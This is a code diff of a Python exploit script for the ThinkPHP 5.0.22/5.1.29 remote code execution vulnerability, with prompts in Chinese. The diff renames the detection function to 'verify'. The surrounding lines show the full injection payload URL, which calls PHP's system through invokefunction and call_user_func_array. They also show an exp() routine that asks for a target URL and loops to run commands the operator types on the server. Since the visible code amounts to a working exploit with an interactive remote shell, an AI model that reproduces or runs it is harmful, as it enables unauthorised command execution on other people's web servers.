@@ -2,7 +2,7 @@ import requests
 import re
 import urllib
 
-def thinkphp5022_5129_rce(url):
+def verify(url):
     relsult = {
         'name': 'Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability',
         'vulnerable': False
@@ -24,7 +24,7 @@ def thinkphp5022_5129_rce(url):
 def exp():
     url = input('输入目标URL:')
     basic_payload = url + r'''/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]='''
-    if thinkphp5022_5129_rce(url):
+    if verify(url):
         print('[+] 存在 Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability')
         while True:
             cmd_shell = input('[+] 执行命令:')
